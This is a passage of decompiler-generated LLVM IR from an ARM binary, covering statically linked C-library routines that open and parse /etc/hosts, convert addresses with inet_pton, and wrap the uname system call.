  %v2_1d674 = sub i32 %v1_1d674, %v2_1d668
  %v7_1d67c = icmp slt i32 %v2_1d674, 4
  br i1 %v7_1d67c, label %bb, label %dec_label_pc_1d684

bb:                                               ; preds = %dec_label_pc_1d674
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1d6ac

dec_label_pc_1d684:                               ; preds = %dec_label_pc_1d674
  %v0_1d684 = load i32, i32* @r4, align 4
  %v1_1d684 = add i32 %v0_1d684, 5
  %v2_1d684 = inttoptr i32 %v1_1d684 to i8*
  %v3_1d684 = load i8, i8* %v2_1d684, align 1
  %v2_1d688 = load i32, i32* @r6, align 4
  %v4_1d688 = add i32 %v2_1d688, %v2_1d668
  %v5_1d688 = inttoptr i32 %v4_1d688 to i8*
  store i8 %v3_1d684, i8* %v5_1d688, align 1
  %v0_1d68c = load i32, i32* @r4, align 4
  %v1_1d68c = add i32 %v0_1d68c, 4
  %v2_1d68c = inttoptr i32 %v1_1d68c to i32*
  %v3_1d68c = load i32, i32* %v2_1d68c, align 4
  %v0_1d690 = load i32, i32* @r6, align 4
  %v1_1d690 = load i32, i32* %r0.global-to-local, align 4
  %v2_1d690 = add i32 %v1_1d690, %v0_1d690
  store i32 %v2_1d690, i32* %r2.global-to-local, align 4
  %v1_1d694 = trunc i32 %v3_1d68c to i8
  %v3_1d694 = add i32 %v2_1d690, 1
  %v4_1d694 = inttoptr i32 %v3_1d694 to i8*
  store i8 %v1_1d694, i8* %v4_1d694, align 1
  %v0_1d698 = load i32, i32* @r4, align 4
  %v1_1d698 = add i32 %v0_1d698, 9
  %v2_1d698 = inttoptr i32 %v1_1d698 to i8*
  %v3_1d698 = load i8, i8* %v2_1d698, align 1
  %v2_1d69c = load i32, i32* %r2.global-to-local, align 4
  %v3_1d69c = add i32 %v2_1d69c, 2
  %v4_1d69c = inttoptr i32 %v3_1d69c to i8*
  store i8 %v3_1d698, i8* %v4_1d69c, align 1
  %v0_1d6a0 = load i32, i32* @r4, align 4
  %v1_1d6a0 = add i32 %v0_1d6a0, 8
  %v2_1d6a0 = inttoptr i32 %v1_1d6a0 to i32*
  %v3_1d6a0 = load i32, i32* %v2_1d6a0, align 4
  %v1_1d6a4 = trunc i32 %v3_1d6a0 to i8
  %v2_1d6a4 = load i32, i32* %r2.global-to-local, align 4
  %v3_1d6a4 = add i32 %v2_1d6a4, 3
  %v4_1d6a4 = inttoptr i32 %v3_1d6a4 to i8*
  store i8 %v1_1d6a4, i8* %v4_1d6a4, align 1
  %v0_1d6a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1d6a8 = add i32 %v0_1d6a8, 4
  store i32 %v1_1d6a8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1d6ac

dec_label_pc_1d6ac:                               ; preds = %bb, %entry, %dec_label_pc_1d684
  %v1_1d6b0 = phi i32 [ -1, %bb ], [ %v2_1d668, %entry ], [ %v1_1d6a8, %dec_label_pc_1d684 ]
  %v2_1d6ac = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1d6ac, i32* @r4, align 4
  store i32 %v9_1d654, i32* @r6, align 4
  ret i32 %v1_1d6b0

; uselistorder directives
  uselistorder i32 %v2_1d668, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 5, 2, 6, 3, 0 }
  uselistorder i32 9, { 22, 23, 24, 27, 28, 4, 26, 21, 5, 15, 0, 16, 32, 6, 7, 14, 25, 12, 13, 17, 18, 19, 20, 8, 9, 10, 11, 3, 2, 1, 29, 30, 31 }
  uselistorder i32 5, { 23, 24, 25, 7, 17, 8, 26, 9, 2, 18, 10, 19, 12, 11, 3, 0, 28, 5, 20, 6, 1, 21, 22, 13, 14, 16, 15, 4, 27 }
  uselistorder label %dec_label_pc_1d6ac, { 2, 0, 1 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  store i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -34244), i32* @r0, align 4
  %v1_1d6cc = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -34244))
  ret i32 %v1_1d6cc

; uselistorder directives
  uselistorder i32 (i32)* @__GI_config_open, { 0, 2, 1 }
}

define i32 @__read_etc_hosts_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v3_1d6e4 = load i32, i32* @r4, align 4
  %v6_1d6e4 = load i32, i32* @r5, align 4
  %v9_1d6e4 = load i32, i32* @r6, align 4
  %v12_1d6e4 = load i32, i32* @r7, align 4
  %v15_1d6e4 = load i32, i32* @r8, align 4
  %v18_1d6e4 = load i32, i32* @sb, align 4
  %v21_1d6e4 = load i32, i32* @sl, align 4
  %v24_1d6e4 = load i32, i32* @fp, align 4
  store i32 %tmp10, i32* @r5, align 4
  store i32 %tmp9, i32* @lr, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 -1, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @r4, align 4
  %v2_1d70c = inttoptr i32 %tmp9 to i32*
  store i32 -1, i32* %v2_1d70c, align 4
  %v0_1d710 = load i32, i32* @r0, align 4
  store i32 %v0_1d710, i32* @r6, align 4
  %v0_1d714 = load i32, i32* @r1, align 4
  %v0_1d718 = load i32, i32* @r2, align 4
  store i32 %v0_1d718, i32* @r8, align 4
  %v0_1d71c = load i32, i32* @r3, align 4
  store i32 %v0_1d71c, i32* @fp, align 4
  %v3_1d720 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1d720, i32* @r7, align 4
  %tmp = icmp ult i32 %tmp10, 129
  br i1 %tmp, label %.thread, label %dec_label_pc_1d72c

.thread:                                          ; preds = %entry
  store i32 34, i32* @sb, align 4
  br label %dec_label_pc_1d8cc

dec_label_pc_1d72c:                               ; preds = %entry
  %v2_1d72c = icmp eq i32 %v0_1d710, 0
  br i1 %v2_1d72c, label %dec_label_pc_1d734, label %dec_label_pc_1d754

dec_label_pc_1d734:                               ; preds = %dec_label_pc_1d72c
  %v0_1d734 = call i32 @__open_etc_hosts()
  store i32 %v0_1d734, i32* @r6, align 4
  %v2_1d738 = icmp eq i32 %v0_1d734, 0
  br i1 %v2_1d738, label %dec_label_pc_1d740, label %dec_label_pc_1d754

dec_label_pc_1d740:                               ; preds = %dec_label_pc_1d734
  store i32 %tmp7, i32* %r2.global-to-local, align 4
  %v2_1d744 = inttoptr i32 %tmp7 to i32*
  store i32 0, i32* %v2_1d744, align 4
  %v0_1d748 = call i32 @__GI___errno_location()
  %v1_1d74c = inttoptr i32 %v0_1d748 to i32*
  %v2_1d74c = load i32, i32* %v1_1d74c, align 4
  store i32 %v2_1d74c, i32* @sb, align 4
  br label %dec_label_pc_1d8cc

dec_label_pc_1d754:                               ; preds = %dec_label_pc_1d734, %dec_label_pc_1d72c
  %v1_1d774 = phi i32 [ %v0_1d734, %dec_label_pc_1d734 ], [ %v0_1d710, %dec_label_pc_1d72c ]
  %v0_1d758 = load i32, i32* @r4, align 4
  %v2_1d758 = add i32 %v0_1d758, -34232
  store i32 %v2_1d758, i32* @r4, align 4
  %v2_1d75c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %tmp6, i32* %ip.global-to-local, align 4
  store i32 %tmp6, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_1d774 = add i32 %v1_1d774, 8
  %v3_1d774 = inttoptr i32 %v2_1d774 to i32*
  store i32 48, i32* %v3_1d774, align 4
  store i32 %tmp9, i32* %r3.global-to-local, align 4
  %v0_1d77c = load i32, i32* @r5, align 4
  %v1_1d77c = add i32 %v0_1d77c, -48
  store i32 %v1_1d77c, i32* %r1.global-to-local, align 4
  %v0_1d780 = load i32, i32* %ip.global-to-local, align 4
  %v1_1d780 = add i32 %v0_1d780, 24
  store i32 %v1_1d780, i32* @ip, align 4
  %v0_1d784 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1d784, i32* @sb, align 4
  %v0_1d788 = load i32, i32* @lr, align 4
  %v1_1d788 = add i32 %v0_1d788, 32
  store i32 %v1_1d788, i32* @sl, align 4
  %v1_1d78c = load i32, i32* @r6, align 4
  %v2_1d78c = add i32 %v1_1d78c, 16
  %v3_1d78c = inttoptr i32 %v2_1d78c to i32*
  store i32 %v1_1d77c, i32* %v3_1d78c, align 4
  %v0_1d790 = load i32, i32* @r4, align 4
  %v0_1d794 = load i32, i32* @ip, align 4
  store i32 %v0_1d794, i32* %stack_var_-64, align 4
  %v0_1d798 = load i32, i32* %r2.global-to-local, align 4
  %v1_1d798 = load i32, i32* %r3.global-to-local, align 4
  %v2_1d798 = inttoptr i32 %v1_1d798 to i32*
  store i32 %v0_1d798, i32* %v2_1d798, align 4
  %v0_1d79c = load i32, i32* @lr, align 4
  %v1_1d79c = load i32, i32* @r6, align 4
  %v2_1d79c = add i32 %v1_1d79c, 4
  %v3_1d79c = inttoptr i32 %v2_1d79c to i32*
  store i32 %v0_1d79c, i32* %v3_1d79c, align 4
  %v2_1d7cc = inttoptr i32 %v0_1d714 to i8*
  br label %dec_label_pc_1d8a0

dec_label_pc_1d7a4:                               ; preds = %dec_label_pc_1d8a0
  %v3_1d7a4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1d7a4, i32* %r1.global-to-local, align 4
  %v0_1d7a8 = load i32, i32* @fp, align 4
  %v7_1d7a8 = icmp eq i32 %v0_1d7a8, 1
  %v1_1d7ac = add i32 %v3_1d7a4, 4
  store i32 %v1_1d7ac, i32* @r5, align 4
  %v1_1d7b0 = load i32, i32* @r7, align 4
  %v2_1d7b0 = add i32 %v1_1d7b0, 4
  %v3_1d7b0 = inttoptr i32 %v2_1d7b0 to i32*
  store i32 %v1_1d7ac, i32* %v3_1d7b0, align 4
  br i1 %v7_1d7a8, label %dec_label_pc_1d8cc, label %dec_label_pc_1d7b8

dec_label_pc_1d7b8:                               ; preds = %dec_label_pc_1d7a4
  %v0_1d7b8 = load i32, i32* @fp, align 4
  %v7_1d7b8 = icmp eq i32 %v0_1d7b8, 2
  br i1 %v7_1d7b8, label %dec_label_pc_1d7c4, label %dec_label_pc_1d7e8.preheader

dec_label_pc_1d7e8.preheader:                     ; preds = %dec_label_pc_1d7b8
  %v1_1d7bc = load i32, i32* @r5, align 4
  %v1_1d7e825 = inttoptr i32 %v1_1d7bc to i32*
  %v2_1d7e826 = load i32, i32* %v1_1d7e825, align 4
  store i32 %v2_1d7e826, i32* %r3.global-to-local, align 4
  store i32 %v2_1d7e826, i32* %r1.global-to-local, align 4
  %v2_1d7ec28 = icmp eq i32 %v2_1d7e826, 0
  %v1_1d7f429 = add i32 %v1_1d7bc, 4
  store i32 %v1_1d7f429, i32* @r4, align 4
  br i1 %v2_1d7ec28, label %dec_label_pc_1d8a0, label %dec_label_pc_1d7dc

dec_label_pc_1d7c4:                               ; preds = %dec_label_pc_1d7b8
  %v0_1d7c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_1d7c4 = inttoptr i32 %v0_1d7c4 to i32*
  %v2_1d7c4 = load i32, i32* %v1_1d7c4, align 4
  store i32 %v2_1d7c4, i32* @r1, align 4
  %v3_1d7cc = call i32 @__GI_strcoll(i8* %v2_1d7cc, i32 %v2_1d7c4)
  %v2_1d7d0 = icmp eq i32 %v3_1d7cc, 0
  br i1 %v2_1d7d0, label %dec_label_pc_1d800, label %dec_label_pc_1d8a0

dec_label_pc_1d7dc:                               ; preds = %dec_label_pc_1d7e8.preheader, %dec_label_pc_1d7dc.dec_label_pc_1d7e8_crit_edge
  %v2_1d7e830 = phi i32 [ %v2_1d7e8, %dec_label_pc_1d7dc.dec_label_pc_1d7e8_crit_edge ], [ %v2_1d7e826, %dec_label_pc_1d7e8.preheader ]
  %v3_1d7dc = call i32 @__GI_strcasecmp(i8* %v2_1d7cc, i32 %v2_1d7e830)
  %v2_1d7e0 = icmp eq i32 %v3_1d7dc, 0
  br i1 %v2_1d7e0, label %dec_label_pc_1d800, label %dec_label_pc_1d7dc.dec_label_pc_1d7e8_crit_edge

dec_label_pc_1d7dc.dec_label_pc_1d7e8_crit_edge:  ; preds = %dec_label_pc_1d7dc
  %v0_1d7e8.pre = load i32, i32* @r4, align 4
  %v1_1d7e8 = inttoptr i32 %v0_1d7e8.pre to i32*
  %v2_1d7e8 = load i32, i32* %v1_1d7e8, align 4
  store i32 %v2_1d7e8, i32* %r3.global-to-local, align 4
  store i32 %v2_1d7e8, i32* %r1.global-to-local, align 4
  %v2_1d7ec = icmp eq i32 %v2_1d7e8, 0
  %v1_1d7f4 = add i32 %v0_1d7e8.pre, 4
  store i32 %v1_1d7f4, i32* @r4, align 4
  br i1 %v2_1d7ec, label %dec_label_pc_1d8a0, label %dec_label_pc_1d7dc

dec_label_pc_1d800:                               ; preds = %dec_label_pc_1d7dc, %dec_label_pc_1d7c4
  %v0_1d800 = load i32, i32* @r5, align 4
  %v1_1d800 = inttoptr i32 %v0_1d800 to i32*
  %v2_1d800 = load i32, i32* %v1_1d800, align 4
  store i32 %v2_1d800, i32* %r3.global-to-local, align 4
  %v4_1d800 = add i32 %v0_1d800, 4
  store i32 %v4_1d800, i32* @r5, align 4
  %v2_1d804 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_1d804, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v1_1d80c = load i32, i32* @r7, align 4
  %v2_1d80c = inttoptr i32 %v1_1d80c to i32*
  store i32 %v2_1d800, i32* %v2_1d80c, align 4
  %v0_1d810 = load i32, i32* @lr, align 4
  %v1_1d810 = load i32, i32* @ip, align 4
  %v2_1d810 = add i32 %v1_1d810, 4
  %v3_1d810 = inttoptr i32 %v2_1d810 to i32*
  store i32 %v0_1d810, i32* %v3_1d810, align 4
  store i32 %tmp6, i32* %r2.global-to-local, align 4
  %v0_1d818 = load i32, i32* @r8, align 4
  %v7_1d818 = icmp eq i32 %v0_1d818, 2
  %v0_1d81c = load i32, i32* @r5, align 4
  %v1_1d81c = load i32, i32* @r7, align 4
  %v2_1d81c = add i32 %v1_1d81c, 4
  %v3_1d81c = inttoptr i32 %v2_1d81c to i32*
  store i32 %v0_1d81c, i32* %v3_1d81c, align 4
  %v0_1d820 = load i32, i32* @ip, align 4
  %v1_1d820 = load i32, i32* @r7, align 4
  %v2_1d820 = add i32 %v1_1d820, 16
  %v3_1d820 = inttoptr i32 %v2_1d820 to i32*
  store i32 %v0_1d820, i32* %v3_1d820, align 4
  %v0_1d824 = load i32, i32* @sl, align 4
  %v1_1d824 = load i32, i32* %r2.global-to-local, align 4
  %v2_1d824 = add i32 %v1_1d824, 24
  %v3_1d824 = inttoptr i32 %v2_1d824 to i32*
  store i32 %v0_1d824, i32* %v3_1d824, align 4
  br i1 %v7_1d818, label %dec_label_pc_1d82c, label %dec_label_pc_1d85c

dec_label_pc_1d82c:                               ; preds = %dec_label_pc_1d800
  %v3_1d82c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1d82c, i32* %r3.global-to-local, align 4
  %v0_1d830 = load i32, i32* @r8, align 4
  %v1_1d834 = inttoptr i32 %v3_1d82c to i32*
  %v2_1d834 = load i32, i32* %v1_1d834, align 4
  store i32 %v2_1d834, i32* %r1.global-to-local, align 4
  %v0_1d838 = load i32, i32* @sl, align 4
  store i32 %v0_1d838, i32* %r2.global-to-local, align 4
  %v3_1d83c = inttoptr i32 %v2_1d834 to i8*
  %v4_1d83c = call i32 @inet_pton(i32 %v0_1d830, i8* %v3_1d83c, i32 %v0_1d838)
  %tmp23 = icmp slt i32 %v4_1d83c, 1
  br i1 %tmp23, label %dec_label_pc_1d89c, label %dec_label_pc_1d848

dec_label_pc_1d848:                               ; preds = %dec_label_pc_1d82c
  %v0_1d84c = load i32, i32* @r7, align 4
  %v2_1d84c = inttoptr i32 %tmp7 to i32*
  store i32 %v0_1d84c, i32* %v2_1d84c, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_1d854 = load i32, i32* @r8, align 4
  %v1_1d854 = load i32, i32* @r7, align 4
  %v2_1d854 = add i32 %v1_1d854, 8
  %v3_1d854 = inttoptr i32 %v2_1d854 to i32*
  store i32 %v0_1d854, i32* %v3_1d854, align 4
  %v0_1d894.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1d890

dec_label_pc_1d85c:                               ; preds = %dec_label_pc_1d800
  %v0_1d85c = load i32, i32* @r8, align 4
  %v7_1d85c = icmp eq i32 %v0_1d85c, 10
  br i1 %v7_1d85c, label %dec_label_pc_1d864, label %dec_label_pc_1d89c

dec_label_pc_1d864:                               ; preds = %dec_label_pc_1d85c
  %v3_1d864 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1d864, i32* %r3.global-to-local, align 4
  %v1_1d86c = inttoptr i32 %v3_1d864 to i32*
  %v2_1d86c = load i32, i32* %v1_1d86c, align 4
  store i32 %v2_1d86c, i32* %r1.global-to-local, align 4
  %v0_1d870 = load i32, i32* @sl, align 4
  store i32 %v0_1d870, i32* %r2.global-to-local, align 4
  %v3_1d874 = inttoptr i32 %v2_1d86c to i8*
  %v4_1d874 = call i32 @inet_pton(i32 10, i8* %v3_1d874, i32 %v0_1d870)
  %tmp24 = icmp slt i32 %v4_1d874, 1
  br i1 %tmp24, label %dec_label_pc_1d89c, label %dec_label_pc_1d880

dec_label_pc_1d880:                               ; preds = %dec_label_pc_1d864
  store i32 %tmp7, i32* @ip, align 4
  %v0_1d884 = load i32, i32* @r8, align 4
  %v1_1d884 = load i32, i32* @r7, align 4
  %v2_1d884 = add i32 %v1_1d884, 8
  %v3_1d884 = inttoptr i32 %v2_1d884 to i32*
  store i32 %v0_1d884, i32* %v3_1d884, align 4
  %v0_1d888 = load i32, i32* @r7, align 4
  %v1_1d888 = load i32, i32* @ip, align 4
  %v2_1d888 = inttoptr i32 %v1_1d888 to i32*
  store i32 %v0_1d888, i32* %v2_1d888, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1d890

dec_label_pc_1d890:                               ; preds = %dec_label_pc_1d848, %dec_label_pc_1d880
  %v0_1d894 = phi i32 [ %v0_1d894.pre, %dec_label_pc_1d848 ], [ 16, %dec_label_pc_1d880 ]
  store i32 0, i32* @sb, align 4
  %v1_1d894 = load i32, i32* @r7, align 4
  %v2_1d894 = add i32 %v1_1d894, 12
  %v3_1d894 = inttoptr i32 %v2_1d894 to i32*
  store i32 %v0_1d894, i32* %v3_1d894, align 4
  br label %dec_label_pc_1d8c4

dec_label_pc_1d89c:                               ; preds = %dec_label_pc_1d85c, %dec_label_pc_1d864, %dec_label_pc_1d82c
  store i32 2, i32* @sb, align 4
  br label %dec_label_pc_1d8a0

dec_label_pc_1d8a0:                               ; preds = %dec_label_pc_1d7e8.preheader, %dec_label_pc_1d7dc.dec_label_pc_1d7e8_crit_edge, %dec_label_pc_1d7c4, %dec_label_pc_1d89c, %dec_label_pc_1d754
  %v0_1d8a0 = load i32, i32* @r6, align 4
  store i32 %v2_1d75c, i32* %r1.global-to-local, align 4
  store i32 459270, i32* %r2.global-to-local, align 4
  store i32 %v0_1d790, i32* %r3.global-to-local, align 4
  %v4_1d8b0 = inttoptr i32 %v0_1d8a0 to i32*
  %v5_1d8b0 = call i32 @__GI_config_read(i32* %v4_1d8b0, i32 %v2_1d75c, i32 459270, i32 %v0_1d790)
  %v2_1d8b4 = icmp eq i32 %v5_1d8b0, 0
  br i1 %v2_1d8b4, label %dec_label_pc_1d8bc, label %dec_label_pc_1d7a4

dec_label_pc_1d8bc:                               ; preds = %dec_label_pc_1d8a0
  %v0_1d8bc = load i32, i32* @fp, align 4
  %v7_1d8bc = icmp eq i32 %v0_1d8bc, 1
  br i1 %v7_1d8bc, label %dec_label_pc_1d8cc, label %dec_label_pc_1d8c4

dec_label_pc_1d8c4:                               ; preds = %dec_label_pc_1d8bc, %dec_label_pc_1d890
  %v0_1d8c4 = load i32, i32* @r6, align 4
  %v1_1d8c8 = inttoptr i32 %v0_1d8c4 to i32*
  %v2_1d8c8 = call i32 @__GI_config_close(i32* %v1_1d8c8)
  br label %dec_label_pc_1d8cc

dec_label_pc_1d8cc:                               ; preds = %dec_label_pc_1d7a4, %.thread, %dec_label_pc_1d8bc, %dec_label_pc_1d740, %dec_label_pc_1d8c4
  %v0_1d8cc = load i32, i32* @sb, align 4
  store i32 %v3_1d6e4, i32* @r4, align 4
  store i32 %v6_1d6e4, i32* @r5, align 4
  store i32 %v9_1d6e4, i32* @r6, align 4
  store i32 %v12_1d6e4, i32* @r7, align 4
  store i32 %v15_1d6e4, i32* @r8, align 4
  store i32 %v18_1d6e4, i32* @sb, align 4
  store i32 %v21_1d6e4, i32* @sl, align 4
  store i32 %v24_1d6e4, i32* @fp, align 4
  ret i32 %v0_1d8cc

; uselistorder directives
  uselistorder i32 %v2_1d7e8, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1d7e8.pre, { 1, 0 }
  uselistorder i32 %v0_1d790, { 1, 0 }
  uselistorder i32 %v2_1d75c, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp9, { 2, 0, 1 }
  uselistorder i32 %tmp7, { 3, 2, 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6, 10, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3, 5, 6, 7, 8 }
  uselistorder i32* %r1.global-to-local, { 5, 0, 1, 2, 3, 7, 4, 6 }
  uselistorder i32 (i32*)* @__GI_config_close, { 1, 0 }
  uselistorder i32 (i32*, i32, i32, i32)* @__GI_config_read, { 2, 0, 1 }
  uselistorder i32 10, { 3, 38, 40, 41, 10, 45, 48, 49, 50, 28, 29, 12, 11, 4, 52, 51, 42, 13, 53, 14, 54, 15, 55, 56, 1, 30, 16, 31, 17, 18, 19, 39, 8, 0, 43, 44, 20, 59, 46, 47, 32, 33, 21, 34, 22, 9, 35, 36, 37, 7, 6, 2, 57, 58, 23, 5, 25, 26, 24, 27, 60 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 1, 0 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 16, 17, 18, 19, 20, 21, 22, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 23, 24, 25, 26, 27, 28, 29, 30, 10, 11, 12, 13, 14, 15 }
  uselistorder i32 24, { 65, 69, 71, 72, 0, 83, 13, 18, 1, 55, 73, 74, 40, 41, 42, 43, 19, 70, 84, 2, 77, 78, 79, 20, 66, 67, 56, 21, 68, 22, 44, 45, 23, 46, 24, 25, 26, 3, 27, 28, 29, 30, 75, 76, 14, 31, 4, 80, 32, 33, 34, 36, 35, 37, 5, 6, 7, 57, 58, 59, 60, 61, 62, 63, 64, 47, 81, 38, 82, 39, 48, 49, 50, 51, 52, 53, 54, 15, 16, 10, 9, 17, 8, 11, 12, 85, 86 }
  uselistorder i32 -48, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 48, { 5, 38, 24, 6, 35, 36, 25, 26, 27, 28, 0, 1, 30, 7, 31, 32, 2, 8, 33, 9, 40, 10, 41, 42, 43, 11, 13, 12, 14, 37, 3, 15, 34, 16, 18, 29, 17, 19, 20, 21, 39, 22, 23, 4 }
  uselistorder i32 34, { 8, 9, 10, 11, 2, 3, 0, 5, 13, 4, 14, 7, 1, 12, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_2a010.835 to i32), { 98, 70, 71, 72, 99, 3, 4, 73, 100, 1, 101, 102, 103, 104, 105, 106, 107, 74, 75, 108, 109, 26, 110, 9, 11, 6, 7, 10, 5, 8, 111, 12, 76, 112, 113, 114, 13, 77, 115, 116, 29, 27, 28, 14, 15, 117, 16, 118, 17, 119, 18, 120, 78, 121, 79, 122, 19, 20, 123, 80, 124, 125, 126, 127, 128, 129, 39, 38, 40, 130, 30, 64, 60, 58, 57, 59, 61, 62, 63, 56, 65, 51, 53, 52, 50, 49, 54, 55, 46, 45, 48, 47, 44, 43, 42, 41, 82, 66, 81, 67, 68, 83, 131, 2, 85, 84, 86, 21, 132, 22, 87, 88, 133, 90, 134, 135, 136, 137, 23, 138, 92, 91, 37, 34, 35, 36, 33, 24, 69, 32, 89, 93, 139, 94, 140, 25, 141, 142, 31, 143, 95, 144, 0, 96, 97 }
  uselistorder i32* @fp, { 37, 38, 39, 40, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 0, 63, 73, 74, 75, 76, 77, 78, 79, 80, 81, 4, 5, 82, 83, 1, 84, 85, 86, 87, 41, 42, 43, 44, 45, 46, 47, 48, 2, 59, 60, 61, 62, 133, 135, 134, 136, 117, 118, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 64, 65, 66, 67, 68, 69, 70, 71, 72, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 31, 32, 33, 34, 35, 36, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 137, 138, 139, 140, 141, 142, 143, 150, 151, 149, 144, 145, 146, 147, 148, 3 }
  uselistorder i32* @sl, { 29, 30, 31, 32, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 54, 55, 56, 57, 58, 0, 59, 1, 60, 61, 62, 63, 64, 65, 66, 67, 68, 8, 9, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 33, 34, 35, 36, 37, 5, 6, 10, 11, 48, 49, 50, 51, 52, 53, 83, 84, 85, 2, 86, 87, 88, 89, 90, 91, 93, 3, 92, 95, 94, 96, 97, 98, 99, 79, 80, 81, 82, 12, 13, 14, 15, 16, 17, 18, 4, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 7 }
  uselistorder i32* @sb, { 16, 17, 18, 19, 24, 25, 26, 27, 28, 29, 42, 30, 31, 32, 2, 33, 70, 71, 3, 72, 73, 74, 75, 76, 77, 78, 5, 6, 7, 79, 80, 81, 82, 83, 84, 85, 20, 21, 22, 23, 34, 35, 36, 37, 38, 39, 40, 41, 88, 91, 89, 90, 92, 86, 87, 8, 9, 10, 11, 12, 13, 14, 0, 15, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 1, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 4 }
  uselistorder i32* @r8, { 41, 42, 43, 44, 45, 46, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 70, 73, 74, 75, 76, 77, 78, 3, 79, 80, 81, 82, 83, 84, 14, 15, 16, 85, 86, 87, 88, 89, 90, 91, 92, 93, 47, 48, 49, 50, 17, 18, 19, 8, 9, 4, 10, 65, 66, 5, 67, 68, 69, 96, 97, 98, 99, 100, 6, 101, 102, 103, 104, 105, 106, 107, 108, 7, 94, 95, 71, 72, 20, 21, 0, 22, 31, 32, 33, 34, 35, 36, 2, 37, 1, 38, 39, 40, 11, 12, 62, 63, 23, 24, 25, 26, 27, 28, 29, 30, 13 }
  uselistorder label %dec_label_pc_1d8cc, { 4, 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_1d8a0, { 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_1d89c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1d890, { 1, 0 }
  uselistorder label %dec_label_pc_1d7dc, { 1, 0 }
}

define i32 @uname(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1d8e8 = load i32, i32* @r7, align 4
  store i32 %v3_1d8e8, i32* %stack_var_-8, align 4
  %v0_1d8f4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1d8f4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1d8f4, -4095
  br i1 %tmp, label %dec_label_pc_1d914, label %dec_label_pc_1d904

dec_label_pc_1d904:                               ; preds = %entry
  %v0_1d904 = call i32 @__GI___errno_location()
  %v0_1d908 = load i32, i32* %r7.global-to-local, align 4
  %v1_1d908 = sub i32 0, %v0_1d908
  %v2_1d90c = inttoptr i32 %v0_1d904 to i32*
  store i32 %v1_1d908, i32* %v2_1d90c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1d914.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1d914

dec_label_pc_1d914:                               ; preds = %entry, %dec_label_pc_1d904
  %v1_1d918 = phi i32 [ %v0_1d8f4, %entry ], [ -1, %dec_label_pc_1d904 ]
  %v2_1d914 = phi i32 [ %v3_1d8e8, %entry ], [ %v2_1d914.pre, %dec_label_pc_1d904 ]
  store i32 %v2_1d914, i32* @r7, align 4
  ret i32 %v1_1d918

; uselistorder directives
  uselistorder i32 %v0_1d8f4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
